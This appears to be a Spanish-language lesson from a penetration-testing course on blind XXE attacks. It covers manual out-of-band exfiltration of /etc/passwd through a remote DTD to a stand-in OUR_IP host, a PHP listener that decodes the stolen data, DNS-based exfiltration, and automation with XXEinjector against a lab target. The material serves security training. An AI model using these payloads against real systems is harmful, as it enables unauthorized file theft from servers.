En la sección anterior, vimos un ejemplo de una vulnerabilidad XXE ciega, donde no recibimos ninguna salida que contuviera alguna de nuestras entidades de entrada XML. Como el servidor web mostraba errores de ejecución de PHP, pudimos utilizar esta falla para leer el contenido de los archivos desde los errores mostrados. En esta sección, veremos cómo podemos obtener el contenido de los archivos en una situación completamente ciega, donde no obtenemos la salida de ninguna de las entidades XML ni se muestran errores de PHP.

---

## Out-of-band Data Exfiltration

Si intentamos repetir alguno de los métodos con el ejercicio que encontramos en `/blind`, notaremos rápidamente que ninguno de ellos parece funcionar, ya que no tenemos forma de imprimir nada en la respuesta de la aplicación web. Para estos casos, podemos utilizar un método conocido como `Out-of-band (OOB) Data Exfiltration`, que a menudo se utiliza en casos ciegos similares con muchos ataques web, como inyecciones SQL ciegas, inyecciones de comandos ciegas, XSS ciegas y, por supuesto, XXE ciegas. Tanto los módulos [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss) como [Whitebox Pentesting 101: Command Injections](https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection) discutieron ataques similares, y aquí utilizaremos un ataque similar, con ligeras modificaciones para adaptarnos a nuestra vulnerabilidad XXE.

En nuestros ataques anteriores, utilizamos un ataque `out-of-band` ya que alojamos el archivo DTD en nuestra máquina e hicimos que la aplicación web se conectara a nosotros (por lo tanto, fuera de banda). Entonces, nuestro ataque esta vez será bastante similar, con una diferencia significativa. En lugar de hacer que la aplicación web envíe nuestra entidad `file` a una entidad XML específica, haremos que la aplicación web envíe una solicitud web a nuestro servidor web con el contenido del archivo que estamos leyendo.

Para hacerlo, primero podemos usar una entidad de parámetro para el contenido del archivo que estamos leyendo mientras utilizamos PHP filter para codificarlo en base64. Luego, crearemos otra entidad de parámetro externa y la referenciamos a nuestra IP, y colocamos el valor del parámetro `file` como parte de la URL solicitada a través de HTTP, de la siguiente manera:


```r
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

Si, por ejemplo, el archivo que queremos leer tenía el contenido de `XXE_SAMPLE_DATA`, entonces el parámetro `file` contendría sus datos codificados en base64 (`WFhFX1NBTVBMRV9EQVRB`). Cuando el XML intenta referenciar el parámetro externo `oob` desde nuestra máquina, solicitará `http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB`. Finalmente, podemos decodificar la cadena `WFhFX1NBTVBMRV9EQVRB` para obtener el contenido del archivo. Incluso podemos escribir un simple script PHP que detecte automáticamente el contenido del archivo codificado, lo decodifique y lo muestre en el terminal:


```r
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

Entonces, primero escribiremos el código PHP anterior en `index.php`, y luego iniciaremos un servidor PHP en el puerto `8000`, de la siguiente manera:


```r
vi index.php # aquí escribimos el código PHP anterior
php -S 0.0.0.0:8000

PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
```

Ahora, para iniciar nuestro ataque, podemos usar un payload similar al que usamos en el ataque basado en errores, y simplemente agregar `<root>&content;</root>`, que es necesario para referenciar nuestra entidad y hacer que envíe la solicitud a nuestra máquina con el contenido del archivo:


```r
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

Luego, podemos enviar nuestra solicitud a la aplicación web: ![blind_request](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_blind_request.jpg)

Finalmente, podemos regresar a nuestro terminal, y veremos que efectivamente recibimos la solicitud y su contenido decodificado:


```r
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 Accepted
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46256 Closing
10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...
```

**Tip:** Además de almacenar nuestros datos codificados en base64 como un parámetro en nuestra URL, podemos utilizar `DNS OOB Exfiltration` colocando los datos codificados como un subdominio para nuestra URL (por ejemplo, `ENCODEDTEXT.our.website.com`), y luego usar una herramienta como `tcpdump` para capturar cualquier tráfico entrante y decodificar la cadena del subdominio para obtener los datos. Por supuesto, este método es más avanzado y requiere más esfuerzo para exfiltrar datos.

---

## Automated OOB Exfiltration

Aunque en algunas ocasiones podemos tener que usar el método manual que aprendimos anteriormente, en muchos otros casos, podemos automatizar el proceso de exfiltración de datos XXE ciegos con herramientas. Una de esas herramientas es [XXEinjector](https://github.com/enjoiz/XXEinjector). Esta herramienta soporta la mayoría de los trucos que aprendimos en este módulo, incluyendo XXE básica, exfiltración de fuente CDATA, XXE basada en errores y XXE ciega OOB.

Para usar esta herramienta para la exfiltración automatizada OOB, primero podemos clonar la herramienta en nuestra máquina, de la siguiente manera:


```r
git clone https://github.com/enjoiz/XXEinjector.git

Cloning into 'XXEinjector'...
...SNIP...
```

Una vez que tengamos la herramienta, podemos copiar la solicitud HTTP desde Burp y escribirla en un archivo para que la herramienta la use. No debemos incluir los datos XML completos, solo la primera línea, y escribir `XXEINJECT` después como un localizador de posición para la herramienta:


```r
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Ahora, podemos ejecutar la herramienta con las flags `--host`/`--httpport` siendo nuestra IP y puerto, la flag `--file` siendo el archivo que escribimos anteriormente, y la flag `--path` siendo el archivo que queremos leer. También seleccionaremos las flags `--oob=http` y `--phpfilter` para repetir el ataque OOB que hicimos anteriormente, de la siguiente manera:


```r
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

...SNIP...
[+] Sending request with malicious XML.
[+] Responding with XML for: /etc/passwd
[+] Retrieved data:
```

Vemos que la herramienta no imprimió directamente los datos. Esto se debe a que estamos codificando los datos en base64, por lo que no se imprimen. En cualquier caso, todos los archivos exfiltrados se almacenan en la carpeta `Logs` bajo la herramienta, y podemos encontrar nuestro archivo allí:


```r
cat Logs/10.129.201.94/etc/passwd.log 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...SNIP..
```

Intenta usar la herramienta para repetir otros métodos XXE que aprendimos.